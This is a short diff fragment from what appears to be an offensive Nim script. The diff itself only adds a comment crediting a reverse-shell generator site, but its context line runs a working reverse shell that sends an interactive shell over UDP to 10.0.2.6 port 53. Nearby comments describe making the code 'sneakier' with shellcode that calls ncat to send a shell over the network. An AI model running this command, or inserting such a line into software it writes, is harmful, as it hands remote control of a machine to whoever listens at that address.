@@ -17,7 +17,7 @@ echo output
 
 discard execCmd("bash -c 'sh -i >& /dev/udp/10.0.2.6/53 0>&1 &'")
 
-
+# reverse shell adapted from https://www.revshells.com/
 # Now we are getting a bit sneakier- in fact we've added a couple of tricks.
 # It does nothing to hide the fact that it has shellcode calling
 # an ncat binary to send a shell over the network.
